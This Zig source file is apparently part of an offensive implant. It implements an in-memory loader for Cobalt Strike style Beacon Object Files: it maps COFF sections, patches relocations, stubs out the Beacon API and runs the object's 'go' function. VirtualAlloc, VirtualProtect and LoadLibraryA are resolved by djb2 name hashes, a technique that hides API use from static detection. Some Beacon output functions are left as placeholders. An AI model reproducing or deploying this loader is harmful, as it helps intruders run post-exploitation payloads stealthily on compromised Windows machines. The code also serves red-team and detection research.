const std = @import("std");
const api = @import("api.zig");
const crypto = @import("crypto.zig");

// --- COFF Constants ---
pub const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;

pub const IMAGE_REL_AMD64_ADDR64: u16 = 0x0001;
pub const IMAGE_REL_AMD64_ADDR32: u16 = 0x0002;
pub const IMAGE_REL_AMD64_ADDR32NB: u16 = 0x0003;
pub const IMAGE_REL_AMD64_REL32: u16 = 0x0004;

pub const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;
pub const IMAGE_SCN_MEM_READ: u32    = 0x40000000;
pub const IMAGE_SCN_MEM_WRITE: u32   = 0x80000000;
pub const IMAGE_SCN_CNT_CODE: u32    = 0x00000020;

// --- COFF Structures ---
pub const COFF_FILE_HEADER = extern struct {
    Machine: u16,
    NumberOfSections: u16,
    TimeDateStamp: u32,
    PointerToSymbolTable: u32,
    NumberOfSymbols: u32,
    SizeOfOptionalHeader: u16,
    Characteristics: u16,
};

pub const COFF_SECTION_HEADER = extern struct {
    Name: [8]u8,
    VirtualSize: u32,
    VirtualAddress: u32,
    SizeOfRawData: u32,
    PointerToRawData: u32,
    PointerToRelocations: u32,
    PointerToLinenumbers: u32,
    NumberOfRelocations: u16,
    NumberOfLinenumbers: u16,
    Characteristics: u32,
};

pub const COFF_RELOCATION = extern struct {
    VirtualAddress: u32,
    SymbolTableIndex: u32,
    Type: u16,
};

pub const COFF_SYMBOL = extern struct {
    Name: extern union {
        ShortName: [8]u8,
        LongName: extern struct {
            Zeros: u32,
            Offset: u32,
        },
    },
    Value: u32,
    SectionNumber: i16,
    Type: u16,
    StorageClass: u8,
    NumberOfAuxSymbols: u8,
};

// --- Beacon API Context ---
pub const BeaconContext = struct {
    arena: std.mem.Allocator,
    output: std.ArrayListUnmanaged(u8),
    args_ptr: ?[*]const u8 = null,
    args_len: u32 = 0,
    args_offset: u32 = 0,
};

var global_context: ?*BeaconContext = null;

// --- Beacon API Implementations (C-compatible) ---
export fn BeaconDataParse(parser: *anyopaque, data: [*]u8, size: u32) callconv(.c) void {
    _ = parser;
    if (global_context) |ctx| {
        ctx.args_ptr = data;
        ctx.args_len = size;
        ctx.args_offset = 0;
    }
}

export fn BeaconDataInt(parser: *anyopaque) callconv(.c) i32 {
    _ = parser;
    if (global_context) |ctx| {
        if (ctx.args_ptr) |ptr| {
            if (ctx.args_offset + 4 <= ctx.args_len) {
                const val = std.mem.readInt(i32, ptr[ctx.args_offset..][0..4], .little);
                ctx.args_offset += 4;
                return val;
            }
        }
    }
    return 0;
}

export fn BeaconDataShort(parser: *anyopaque) callconv(.c) i16 {
    _ = parser;
    if (global_context) |ctx| {
        if (ctx.args_ptr) |ptr| {
            if (ctx.args_offset + 2 <= ctx.args_len) {
                const val = std.mem.readInt(i16, ptr[ctx.args_offset..][0..2], .little);
                ctx.args_offset += 2;
                return val;
            }
        }
    }
    return 0;
}

export fn BeaconDataLength(parser: *anyopaque) callconv(.c) i32 {
    _ = parser;
    if (global_context) |ctx| {
        return @intCast(ctx.args_len - ctx.args_offset);
    }
    return 0;
}

export fn BeaconDataExtract(parser: *anyopaque, size: ?*i32) callconv(.c) ?[*]u8 {
    _ = parser;
    if (global_context) |ctx| {
        if (ctx.args_ptr) |ptr| {
            if (ctx.args_offset + 4 <= ctx.args_len) {
                const len = std.mem.readInt(u32, ptr[ctx.args_offset..][0..4], .little);
                ctx.args_offset += 4;
                if (ctx.args_offset + len <= ctx.args_len) {
                    if (size) |s| s.* = @intCast(len);
                    const res = @constCast(ptr + ctx.args_offset);
                    ctx.args_offset += len;
                    return res;
                }
            }
        }
    }
    return null;
}

export fn BeaconFormatAlloc(format: *anyopaque, maxsz: i32) callconv(.c) void {
    _ = format; _ = maxsz;
}

export fn BeaconFormatReset(format: *anyopaque) callconv(.c) void {
    _ = format;
}

export fn BeaconFormatFree(format: *anyopaque) callconv(.c) void {
    _ = format;
}

export fn BeaconFormatAppend(format: *anyopaque, text: [*]const u8, len: i32) callconv(.c) void {
    _ = format;
    if (global_context) |ctx| {
        ctx.output.appendSlice(ctx.arena, text[0..@intCast(len)]) catch {};
    }
}

export fn BeaconFormatPrintf(format: *anyopaque, fmt: [*:0]const u8, ...) callconv(.c) void {
    _ = format; _ = fmt;
    // Basic implementation - real one would need varargs handling
}

export fn BeaconFormatToString(format: *anyopaque, size: *i32) callconv(.c) ?[*]u8 {
    _ = format;
    if (global_context) |ctx| {
        size.* = @intCast(ctx.output.items.len);
        return ctx.output.items.ptr;
    }
    return null;
}

export fn BeaconFormatInt(format: *anyopaque, val: i32) callconv(.c) void {
    _ = format;
    if (global_context) |ctx| {
        var buf: [4]u8 = undefined;
        std.mem.writeInt(i32, &buf, val, .big);
        ctx.output.appendSlice(ctx.arena, &buf) catch {};
    }
}

export fn BeaconPrintf(typ: i32, fmt: [*:0]const u8, ...) callconv(.c) void {
    _ = typ; _ = fmt;
    // TODO: implement real printf if needed, for now just placeholder
}

export fn BeaconOutput(typ: i32, data: [*]const u8, len: i32) callconv(.c) void {
    _ = typ;
    if (global_context) |ctx| {
        ctx.output.appendSlice(ctx.arena, data[0..@intCast(len)]) catch {};
    }
}

export fn BeaconIsAdmin() callconv(.c) i32 {
    return 0; // TODO: implement
}

// --- Internal Symbol Table ---
const InternalSymbol = struct {
    name: []const u8,
    addr: usize,
};

fn getInternalSymbols() [15]InternalSymbol {
    return [_]InternalSymbol{
        .{ .name = "BeaconDataParse",   .addr = @intFromPtr(&BeaconDataParse) },
        .{ .name = "BeaconDataInt",     .addr = @intFromPtr(&BeaconDataInt) },
        .{ .name = "BeaconDataShort",   .addr = @intFromPtr(&BeaconDataShort) },
        .{ .name = "BeaconDataLength",  .addr = @intFromPtr(&BeaconDataLength) },
        .{ .name = "BeaconDataExtract", .addr = @intFromPtr(&BeaconDataExtract) },
        .{ .name = "BeaconFormatAlloc", .addr = @intFromPtr(&BeaconFormatAlloc) },
        .{ .name = "BeaconFormatReset", .addr = @intFromPtr(&BeaconFormatReset) },
        .{ .name = "BeaconFormatFree",  .addr = @intFromPtr(&BeaconFormatFree) },
        .{ .name = "BeaconFormatAppend",.addr = @intFromPtr(&BeaconFormatAppend) },
        .{ .name = "BeaconFormatPrintf",.addr = @intFromPtr(&BeaconFormatPrintf) },
        .{ .name = "BeaconFormatToString", .addr = @intFromPtr(&BeaconFormatToString) },
        .{ .name = "BeaconFormatInt",   .addr = @intFromPtr(&BeaconFormatInt) },
        .{ .name = "BeaconPrintf",      .addr = @intFromPtr(&BeaconPrintf) },
        .{ .name = "BeaconOutput",      .addr = @intFromPtr(&BeaconOutput) },
        .{ .name = "BeaconIsAdmin",     .addr = @intFromPtr(&BeaconIsAdmin) },
    };
}

pub const BofLoader = struct {
    arena: std.mem.Allocator,
    log: *const fn(std.mem.Allocator, []const u8) void,

    pub fn loadAndRun(self: *BofLoader, coff_data: []const u8, args: []const u8) ![]u8 {
        if (coff_data.len < @sizeOf(COFF_FILE_HEADER)) return error.InvalidCoff;
        
        const header = @as(*const COFF_FILE_HEADER, @ptrCast(@alignCast(coff_data.ptr)));
        if (header.Machine != IMAGE_FILE_MACHINE_AMD64) return error.UnsupportedMachine;

        // 1. Map Sections
        const section_headers = @as([*]const COFF_SECTION_HEADER, @ptrCast(@alignCast(coff_data.ptr + @sizeOf(COFF_FILE_HEADER))));
        
        var section_mappings = try self.arena.alloc(usize, header.NumberOfSections);
        
        // Resolve necessary functions for allocation
        const kbase = api.getModuleHandleByHash(comptime crypto.djb2_i("KERNELBASE.DLL")).?;
        const VirtualAlloc_ = @as(*const fn(?*anyopaque, usize, u32, u32) callconv(.winapi) ?*anyopaque, @ptrCast(api.getProcAddressByHash(kbase, comptime crypto.djb2("VirtualAlloc")).?));
        const VirtualProtect_ = @as(*const fn(?*anyopaque, usize, u32, *u32) callconv(.winapi) i32, @ptrCast(api.getProcAddressByHash(kbase, comptime crypto.djb2("VirtualProtect")).?));
        const LoadLibraryA_ = @as(api.LoadLibraryAFn, @ptrCast(api.getProcAddressByHash(kbase, comptime crypto.djb2("LoadLibraryA")).?));

        for (0..header.NumberOfSections) |i| {
            const sh = section_headers[i];
            if (sh.SizeOfRawData == 0) {
                section_mappings[i] = 0;
                continue;
            }

            const addr = VirtualAlloc_(null, sh.SizeOfRawData, api.MEM_COMMIT | api.MEM_RESERVE, api.PAGE_READWRITE) orelse return error.AllocFailed;
            @memcpy(@as([*]u8, @ptrCast(addr)), coff_data[sh.PointerToRawData..][0..sh.SizeOfRawData]);
            section_mappings[i] = @intFromPtr(addr);
        }

        // 2. Resolve Relocations
        const symbol_table = @as([*]const COFF_SYMBOL, @ptrCast(@alignCast(coff_data.ptr + header.PointerToSymbolTable)));
        const string_table = coff_data.ptr + header.PointerToSymbolTable + (header.NumberOfSymbols * @sizeOf(COFF_SYMBOL));
        const symbols = getInternalSymbols();

        for (0..header.NumberOfSections) |i| {
            const sh = section_headers[i];
            if (sh.NumberOfRelocations == 0) continue;

            const relocs = @as([*]const COFF_RELOCATION, @ptrCast(@alignCast(coff_data.ptr + sh.PointerToRelocations)));
            const section_base = section_mappings[i];

            for (0..sh.NumberOfRelocations) |j| {
                const rel = relocs[j];
                const sym = symbol_table[rel.SymbolTableIndex];
                
                var sym_name: []const u8 = undefined;
                if (sym.Name.LongName.Zeros == 0) {
                    const offset = sym.Name.LongName.Offset;
                    var len: usize = 0;
                    while (string_table[offset + len] != 0) len += 1;
                    sym_name = string_table[offset..][0..len];
                } else {
                    var len: usize = 0;
                    while (len < 8 and sym.Name.ShortName[len] != 0) len += 1;
                    sym_name = sym.Name.ShortName[0..len];
                }

                var sym_addr: usize = 0;
                if (sym.SectionNumber > 0) {
                    sym_addr = section_mappings[@intCast(sym.SectionNumber - 1)] + sym.Value;
                } else if (sym.SectionNumber == 0) {
                    // External symbol
                    if (std.mem.startsWith(u8, sym_name, "__imp_")) {
                        const dll_func = sym_name[6..];
                        if (std.mem.indexOf(u8, dll_func, "$")) |idx| {
                            const dll_name = try self.arena.alloc(u8, idx + 4);
                            @memcpy(dll_name[0..idx], dll_func[0..idx]);
                            @memcpy(dll_name[idx..], ".dll");
                            const func_name = try self.arena.dupeZ(u8, dll_func[idx+1..]);
                            
                            const hDll = LoadLibraryA_(try self.arena.dupeZ(u8, dll_name)) orelse {
                                self.log(self.arena, try std.fmt.allocPrint(self.arena, "Failed to load DLL: {s}", .{dll_name}));
                                return error.SymbolNotFound;
                            };
                            sym_addr = @intFromPtr(api.getProcAddressByHash(hDll, crypto.djb2(func_name)));
                        } else {
                            // Internal Beacon API
                            for (symbols) |is| {
                                if (std.mem.eql(u8, is.name, dll_func)) {
                                    sym_addr = is.addr;
                                    break;
                                }
                            }
                        }
                    }
                    if (sym_addr == 0) {
                         self.log(self.arena, try std.fmt.allocPrint(self.arena, "Symbol not found: {s}", .{sym_name}));
                         return error.SymbolNotFound;
                    }
                }

                const patch_addr = section_base + rel.VirtualAddress;
                switch (rel.Type) {
                    IMAGE_REL_AMD64_ADDR64 => {
                        @as(*u64, @ptrFromInt(patch_addr)).* = @intCast(sym_addr);
                    },
                    IMAGE_REL_AMD64_REL32 => {
                        const diff = @as(i64, @intCast(sym_addr)) - @as(i64, @intCast(patch_addr + 4));
                        @as(*i32, @ptrFromInt(patch_addr)).* = @as(i32, @intCast(diff));
                    },
                    else => {
                        self.log(self.arena, try std.fmt.allocPrint(self.arena, "Unsupported relocation type: {d}", .{rel.Type}));
                        return error.UnsupportedReloc;
                    },
                }
            }
        }

        // 3. Find 'go' symbol
        var go_addr: usize = 0;
        for (0..header.NumberOfSymbols) |i| {
            const sym = symbol_table[i];
            var sym_name: []const u8 = undefined;
            if (sym.Name.LongName.Zeros == 0) {
                const offset = sym.Name.LongName.Offset;
                var len: usize = 0;
                while (string_table[offset + len] != 0) len += 1;
                sym_name = string_table[offset..][0..len];
            } else {
                var len: usize = 0;
                while (len < 8 and sym.Name.ShortName[len] != 0) len += 1;
                sym_name = sym.Name.ShortName[0..len];
            }

            if (std.mem.eql(u8, sym_name, "go")) {
                go_addr = section_mappings[@intCast(sym.SectionNumber - 1)] + sym.Value;
                break;
            }
        }

        if (go_addr == 0) return error.GoNotFound;

        // 4. Finalize Protections
        for (0..header.NumberOfSections) |i| {
            const sh = section_headers[i];
            if (section_mappings[i] == 0) continue;

            var old: u32 = 0;
            var prot: u32 = api.PAGE_READWRITE;
            if ((sh.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0) {
                prot = if ((sh.Characteristics & IMAGE_SCN_MEM_WRITE) != 0) api.PAGE_EXECUTE_READWRITE else api.PAGE_EXECUTE_READ;
            } else if ((sh.Characteristics & IMAGE_SCN_MEM_WRITE) == 0) {
                prot = api.PAGE_READWRITE; // Keep RW for now? Or PAGE_READONLY
            }
            _ = VirtualProtect_(@ptrFromInt(section_mappings[i]), sh.SizeOfRawData, prot, &old);
        }

        // 5. Execute
        var context = BeaconContext{
            .arena = self.arena,
            .output = .empty,
        };
        global_context = &context;
        defer global_context = null;

        const GoFn = *const fn([*]u8, u32) callconv(.c) void;
        const go = @as(GoFn, @ptrFromInt(go_addr));
        
        // BOFs expect arguments as a pointer and length
        // We'll pass the raw args for now
        go(@constCast(args.ptr), @intCast(args.len));

        return context.output.toOwnedSlice(self.arena);
    }
};
